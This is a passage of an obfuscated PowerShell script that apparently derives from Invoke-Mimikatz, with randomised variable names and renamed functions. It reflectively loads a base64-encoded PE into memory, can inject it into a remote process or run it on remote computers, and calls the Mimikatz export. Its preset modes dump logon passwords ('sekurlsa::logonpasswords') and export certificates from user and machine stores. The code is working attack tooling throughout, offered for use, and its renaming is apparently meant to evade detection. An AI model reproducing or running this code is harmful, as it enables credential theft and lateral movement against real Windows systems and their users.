		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$EbqIceBD99
		)
		
		$Win32Constants = actress
		$EuQVwKhg99 = glorification
		$zAfvSIaE99 = archeologists
		
		$PEInfo = nonconductor -PEHandle $EbqIceBD99 -Win32Types $zAfvSIaE99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$HiEQpzoi99 = palmettoes ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$aLtJgJZN99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($HiEQpzoi99, [Type]$zAfvSIaE99.IMAGE_IMPORT_DESCRIPTOR)
				
				if ($aLtJgJZN99.Characteristics -eq 0 `
						-and $aLtJgJZN99.FirstThunk -eq 0 `
						-and $aLtJgJZN99.ForwarderChain -eq 0 `
						-and $aLtJgJZN99.Name -eq 0 `
						-and $aLtJgJZN99.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
				$httfOBUT99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((palmettoes ([Int64]$PEInfo.PEHandle) ([Int64]$aLtJgJZN99.Name)))
				$yfUCyaSd99 = $EuQVwKhg99.GetModuleHandle.Invoke($httfOBUT99)
				if ($yfUCyaSd99 -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $httfOBUT99. Continuing anyways" -WarningAction Continue
				}
				
				$HXKXgwOZ99 = $EuQVwKhg99.FreeLibrary.Invoke($yfUCyaSd99)
				if ($HXKXgwOZ99 -eq $false)
				{
					Write-Warning "Unable to free library: $httfOBUT99. Continuing anyways." -WarningAction Continue
				}
				
				$HiEQpzoi99 = palmettoes ($HiEQpzoi99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$zAfvSIaE99.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$SgufstCa99 = palmettoes ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$wStdtpXm99 = cataleptic @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$ZIgcIefN99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SgufstCa99, $wStdtpXm99)
		
		$ZIgcIefN99.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$HXKXgwOZ99 = $EuQVwKhg99.VirtualFree.Invoke($EbqIceBD99, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($HXKXgwOZ99 -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function Main
	{
		$EuQVwKhg99 = glorification
		$zAfvSIaE99 = archeologists
		$Win32Constants =  actress
		
		$ILaWeMxR99 = [IntPtr]::Zero
	
		if (($cDeipBOu99 -ne $null) -and ($cDeipBOu99 -ne 0) -and ($dRdIAWyC99 -ne $null) -and ($dRdIAWyC99 -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($dRdIAWyC99 -ne $null -and $dRdIAWyC99 -ne "")
		{
			$jsgLpbWu99 = @(Get-Process -Name $dRdIAWyC99 -ErrorAction SilentlyContinue)
			if ($jsgLpbWu99.Count -eq 0)
			{
				Throw "Can't find process $dRdIAWyC99"
			}
			elseif ($jsgLpbWu99.Count -gt 1)
			{
				$vfUhyQUR99 = Get-Process | where { $_.Name -eq $dRdIAWyC99 } | Select-Object ProcessName, Id, SessionId
				Write-Output $vfUhyQUR99
				Throw "More than one instance of $dRdIAWyC99 found, please specify the process ID to inject in to."
			}
			else
			{
				$cDeipBOu99 = $jsgLpbWu99[0].ID
			}
		}
		
		
		if (($cDeipBOu99 -ne $null) -and ($cDeipBOu99 -ne 0))
		{
			$ILaWeMxR99 = $EuQVwKhg99.OpenProcess.Invoke(0x001F0FFF, $false, $cDeipBOu99)
			if ($ILaWeMxR99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $cDeipBOu99"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		
		Write-Verbose "Calling wanderers"
        try
        {
            $bRkmDyQN99 = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if ($bRkmDyQN99 -is [array])
        {
            $YEPWweuU99 = $bRkmDyQN99[0]
        } else {
            $YEPWweuU99 = $bRkmDyQN99
        }
        if ( ( $YEPWweuU99.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $YEPWweuU99.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$xcecESTK99 = [Byte[]][Convert]::FromBase64String($FLLIRWIn99)
        }
        else
        {
            [Byte[]]$xcecESTK99 = [Byte[]][Convert]::FromBase64String($OXqPvYRq99)
        }
        $xcecESTK99[0] = 0
        $xcecESTK99[1] = 0
		$EbqIceBD99 = [IntPtr]::Zero
		if ($ILaWeMxR99 -eq [IntPtr]::Zero)
		{
			$dQLyoofq99 = wanderers -PEBytes $xcecESTK99 -ExeArgs $UdqEmWRT99
		}
		else
		{
			$dQLyoofq99 = wanderers -PEBytes $xcecESTK99 -ExeArgs $UdqEmWRT99 -RemoteProcHandle $ILaWeMxR99
		}
		if ($dQLyoofq99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$EbqIceBD99 = $dQLyoofq99[0]
		$givAufXC99 = $dQLyoofq99[1] #only matters if you loaded in to a remote process
		
		
		$PEInfo = nonconductor -PEHandle $EbqIceBD99 -Win32Types $zAfvSIaE99 -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($ILaWeMxR99 -eq [IntPtr]::Zero))
		{
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$FAJxBJlz99 = forecast -PEHandle $EbqIceBD99 -FunctionName "powershell_reflective_mimikatz"
				    if ($FAJxBJlz99 -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $pTwoXXQb99 = cataleptic @([IntPtr]) ([IntPtr])
				    $CCnbihgX99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FAJxBJlz99, $pTwoXXQb99)
                    $rNnfGZYg99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UdqEmWRT99)
				    [IntPtr]$FjcImqMR99 = $CCnbihgX99.Invoke($rNnfGZYg99)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($rNnfGZYg99)
				    if ($FjcImqMR99 -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $uXzMQWaZ99 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($FjcImqMR99)
				        Write-Output $uXzMQWaZ99
				        $EuQVwKhg99.LocalFree.Invoke($FjcImqMR99);
				    }
		}
		elseif (($PEInfo.FileType -ieq "DLL") -and ($ILaWeMxR99 -ne [IntPtr]::Zero))
		{
			$RUxevvnM99 = forecast -PEHandle $EbqIceBD99 -FunctionName "VoidFunc"
			if (($RUxevvnM99 -eq $null) -or ($RUxevvnM99 -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$RUxevvnM99 = roads $RUxevvnM99 $EbqIceBD99
			$RUxevvnM99 = palmettoes $RUxevvnM99 $givAufXC99
			
			$oxKACvse99 = splodge -ProcessHandle $ILaWeMxR99 -StartAddress $RUxevvnM99 -Win32Functions $EuQVwKhg99
		}
		
		if ($ILaWeMxR99 -eq [IntPtr]::Zero)
		{
			discountenances -PEHandle $EbqIceBD99
		}
		else
		{
			$HXKXgwOZ99 = $EuQVwKhg99.VirtualFree.Invoke($EbqIceBD99, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($HXKXgwOZ99 -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}
	Main
}
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$eJHZYdDx99  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$UdqEmWRT99 = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $UdqEmWRT99 = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $UdqEmWRT99 = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if ($usyxzTdY99 -eq $null -or $usyxzTdY99 -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $hBgYjoRh99 -ArgumentList @($FLLIRWIn99, $OXqPvYRq99, "Void", 0, "", $UdqEmWRT99)
	}
	else
	{
		Invoke-Command -ScriptBlock $hBgYjoRh99 -ArgumentList @($FLLIRWIn99, $OXqPvYRq99, "Void", 0, "", $UdqEmWRT99) -ComputerName $usyxzTdY99
	}
}
Main
}